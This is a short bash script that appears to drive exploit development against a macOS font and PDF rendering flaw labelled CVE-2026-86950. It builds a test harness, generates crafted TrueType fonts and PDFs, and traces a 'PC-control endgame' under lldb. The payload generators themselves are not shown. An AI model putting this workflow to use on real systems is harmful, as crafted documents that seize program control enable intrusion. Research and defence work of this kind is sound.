#!/bin/bash
# RIP-36: PC-control endgame (record hijack via own provider)
set -x
cd detonation/cve-2026-86950
clang -O0 -g -o render6 render6.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python -c "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('k2_s1000.ttf', 1000)"
./venv/bin/python gen_pdf.py k2_s1000.pdf k2_s1000.ttf
./venv/bin/python -c "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('k2_d31472.ttf', 31472)"
./venv/bin/python gen_pdf.py k2_d31472.pdf k2_d31472.ttf
rm -f rip36_trace.txt
lldb -b ./render6 -o "command script import $PWD/../cg-extract/rip36.py" > rip36_session.txt 2>&1 || true
cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{rip36_trace.txt,rip36_session.txt} findings/ 2>/dev/null
ls findings/ | wc -l
cat detonation/cve-2026-86950/rip36_trace.txt
